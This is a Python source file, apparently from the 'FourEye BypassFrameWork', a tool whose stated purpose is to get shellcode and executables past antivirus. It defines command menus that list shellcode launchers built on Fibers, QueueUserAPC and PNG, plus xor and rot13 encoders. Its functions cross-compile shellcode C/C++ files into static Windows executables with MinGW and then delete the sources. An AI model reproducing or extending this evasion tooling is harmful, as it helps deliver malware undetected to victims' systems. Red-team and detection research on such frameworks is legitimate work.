#!/usr/bin/python

from termcolor import colored
import os




oct_commands = ["exe","shellcode","list","back","help","exit"]
shellcode_commands = ["xor","rot13","list","execute","png","exit","back"]

def completer(text, state):
    options = [i for i in oct_commands if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None

def shellcode_completer(text, state):
    options = [i for i in shellcode_commands if i.startswith(text)]
    if state < len(options):
        return options[state]
    else:
        return None


def list():
    print(colored("[+] Shellcode：", "red"))
    print(colored("[+] Exe：", "red"))

def bypass_list():
    print(colored("[+] BypassAV1：Shellcode Launcher using Fibers", "red"))
    print(colored("[+] BypassAV2：Shellcode Launcher using QueueUserAPC", "red"))
    print(colored("[+] BypassAV3：Shellcode Launcher using PNG", "red"))

def help():
    print(colored("Available commands to use :\n","cyan"))
    print(colored("Hint : You can use the tab key to complete the command. \n","cyan"))
    print(colored("++++++++++++++++++++++++++++++++++++++++++++++++++++","cyan"))
    print(colored("help  \t\t\t\tshow this help menu","blue"))
    print(colored("exit \t\t\t\texit current session","blue"))
    print(colored("list \t\t\t\tlist current menu all features","blue"))

def x64cpp_execute():
    try:
        os.system('x86_64-w64-mingw32-g++ ' + '/root/shellcode.cpp' + ' -o ' + '/root/shellcode.exe' + " --static" + " -w")
        os.system('rm -rf ' + '/root/shellcode.cpp')
        print(colored("[+]shellcode compoile at /root/shellcode.exe\n","cyan"))
    except:
        print(colored("[-]error\n","cyan"))

def x86cpp_execute():
    try:
        os.system('i686-w64-mingw32-g++ ' + '-m32 ' + '/root/shellcode.cpp' + ' -o ' + '/root/shellcode.exe' + " --static" + " -w")
        os.system('rm -rf ' + '/root/shellcode.cpp')
        print(colored("[+]shellcode compoile at /root/shellcode.exe\n","cyan"))
    except:
        print(colored("[-]error\n","cyan"))

def x64c_execute():
    try:
        os.system('x86_64-w64-mingw32-gcc ' + '/root/shellcode.c' + ' -o ' + '/root/shellcode.exe' + " --static" + " -w")
        os.system('rm -rf '+ '/root/shellcode.c')
        print(colored("[+]shellcode compoile at /root/shellcode.exe\n","cyan"))
    except:
        print(colored("[-]error\n","cyan"))

def x86c_execute():
    try:
        os.system('i686-w64-mingw32-gcc ' + '-m32 ' + '/root/shellcode.c' + ' -o ' + '/root/shellcode.exe' + " --static" + " -w")
        os.system('rm -rf '+ '/root/shellcode.c')
        print(colored("[+]shellcode compoile at /root/shellcode.exe\n","cyan"))
    except:
        print(colored("[-]error\n","cyan"))


def banner():
    version = '\33[43m V1.0 Beta \033[0m'
    Yellow = '\33[33m'
    OKGREEN = '\033[92m'
    CRED = '\033[91m'
    ENDC = '\033[0m'

    title = '''
{0} 
 ______                   ___           
(_) |                    / (_)          
   _|_  __          ,_   \__         _  
  / | |/  \_|   |  /  |  /    |   | |/  
 (_/   \__/  \_/|_/   |_/\___/ \_/|/|__/
                                 /|     
                                 \|   
{1}

                    {3}v1.7 stable !{1}
                    {3}author lengyi@HongHuSec Lab !{1}

{2} FourEye BypassFrameWork | BypassAV your shellcode && exe {1}
    '''
    print((title.format(CRED, ENDC, OKGREEN, Yellow)))
